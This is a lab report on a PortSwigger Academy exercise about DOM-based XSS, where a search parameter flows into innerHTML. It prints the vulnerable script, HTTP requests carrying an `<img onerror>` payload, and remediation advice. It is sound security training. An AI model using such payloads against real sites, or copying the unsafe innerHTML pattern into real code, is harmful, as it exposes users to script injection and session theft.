# PortSwigger Web Security Academy Lab Report: DOM XSS in innerHTML Sink Using Source location.search




**Report ID:** PS-LAB-XSS-004  

**Author:** Venu Kumar (Venu)  

**Date:** February 11, 2026  

**Lab Level:** Apprentice  

**Lab Title:** DOM XSS in innerHTML sink using source location.search



## Executive Summary:

**Vulnerability Type:** DOM-based Cross-Site Scripting (XSS)  

**Severity:** High (CVSS 3.1 Score: ~7.1 – AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N – client-side execution; lab solves on alert trigger)

**Description:** A DOM-based XSS vulnerability exists in the search blog functionality. Client-side JavaScript extracts the `search` parameter from `location.search` and assigns it unsafely to `innerHTML` of a `<span>` or `<div>` element (e.g., search results message). No encoding or sanitization occurs, allowing arbitrary HTML/JavaScript injection directly into the DOM.

**Impact:** An attacker can craft a malicious URL with an XSS payload in the `?search=` parameter. If a victim visits the link (phishing/social engineering), the script executes in their browser context — potential for cookie/session theft, keylogging, redirection, or defacement in production.

**Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.



## Environment and Tools Used:


**Target:** Simulated blog from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Browser Developer Tools (Inspect Element, Console, Sources tab)  
  Optional: Burp Suite Community Edition (for URL manipulation)  

**Operating System:** Windows 11  

**Test Date/Time:** February 11, 2026, approximately 10:12 PM IST



## Methodology:

Conducted ethically in simulated environment.

1. Accessed lab via "Access the lab" in PortSwigger Academy.  
2. Entered random alphanumeric string (e.g., `test123abc`) in search box → submitted.  
3. Used DevTools (Inspect Element) to locate reflection: inside `<span id="searchMessage">` or similar via `innerHTML`.  
4. Crafted payload to inject valid HTML: `<img src=1 onerror=alert(1)>` (invalid src triggers onerror event).  
5. Loaded URL with payload: `/?search=<img src=1 onerror=alert(1)>`  
6. Page loaded → script executed, alert(1) popped up.  
7. Lab solved (green banner: "Congratulations, you solved the lab!").



## Detailed Findings:

**Vulnerable Code (Client-Side JavaScript Example):**

**Original Input (Safe Test):**

GET /?search=<img.yghsvc6386764t32234 HTTP/2
Host: 0a9900690444dc4a8047daaf00a600a9.web-security-academy.net
Cookie: session=ExozWq0zLtI7y9mZwH0yXjbE9YWaqXM8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8


**Reflected Output:**

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3708

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS in innerHTML sink using source location.search</title>
</head>
<body>
    <!-- Lab header: "Not solved" status -->
    
    <!-- Vulnerable search results header: -->
    <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
    
    <!-- Key JS revealing the vuln: -->
    <script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) doSearchQuery(query);
    </script>
    
    <!-- Search form + "Back to Blog" -->
</body>
</html>



Modified request 1:

GET /?search=<img src=1 onerror=alert(1)> HTTP/2
Host: 0a9900690444dc4a8047daaf00a600a9.web-security-academy.net
Cookie: session=ExozWq0zLtI7y9mZwH0yXjbE9YWaqXM8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8


Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6849

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS in innerHTML sink using source location.search</title>
</head>
<body>
    <!-- Lab header: "SOLVED" status + celebration message -->
    
    <!-- Vulnerable search results: -->
    <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
    
    <!-- Key JS: location.search → innerHTML sink -->
    <script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) doSearchQuery(query);
    </script>
</body>
</html>



Proof of Exploitation:


![Proof of XSS  Error](https://github.com/venu-maxx/PortSwigger-XSS-Lab-4/blob/8050c72232c4e30b413fcf202c402061a92ad4fb/Portswigger%20XSS%20Lab%204%20error%201.png)

Figure 1: Malicious payload in ?search= parameter.


![Proof of Successful XSS Exploitation](https://github.com/venu-maxx/PortSwigger-XSS-Lab-4/blob/b3dad6f94428ad35ef6bfe54cedc2dfbe806bdd2/PortSwigger%20XSS%20Lab%204%20success.png)

Figure 2: JavaScript alert(1) pops up on page load due to DOM XSS.


![Lab Solved Congratulations]()

Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"



Exploitation Explanation:

location.search (source) → innerHTML (sink). Data from query string flows unsafely into HTML element contents. <img src=1 onerror=alert(1)> injects an element with an invalid src (triggers onerror) to run JS. This is DOM-based (client-side manipulation, no server reflection). No CSP or sanitization prevents execution.



Risk Assessment:

Likelihood: High (controllable URL parameter, no sanitization).
Impact: High — client-side code execution; enables phishing, session hijacking.
Affected Components: Client-side JS handling search query display.



Recommendations for Remediation:

Avoid innerHTML — use safer methods like textContent, createTextNode(), or insertAdjacentText().
Encode output for HTML context (HTML-encode query params before insertion).
Implement Content Security Policy (CSP) to restrict inline/event-handler scripts.
Sanitize client-side if necessary (e.g., DOMPurify library).
Test with tools like Burp DOM Invader or manual DevTools inspection.



Conclusion and Lessons Learned:

This lab demonstrated DOM-based XSS in innerHTML sink fed by location.search source — solved with an event-handler payload (<img src=1 onerror=alert(1)>).

Key Takeaways:

DOM XSS is client-side (inspect DOM, not View Source).
innerHTML is dangerous with untrusted data — prefer textContent.
Use invalid src + onerror (or onload) for reliable execution in HTML context.
Enhanced skills in DOM analysis, payload breakout, and client-side vuln reporting.



References:

PortSwigger Academy: DOM XSS in innerHTML sink using source location.search
General: DOM-based cross-site scripting
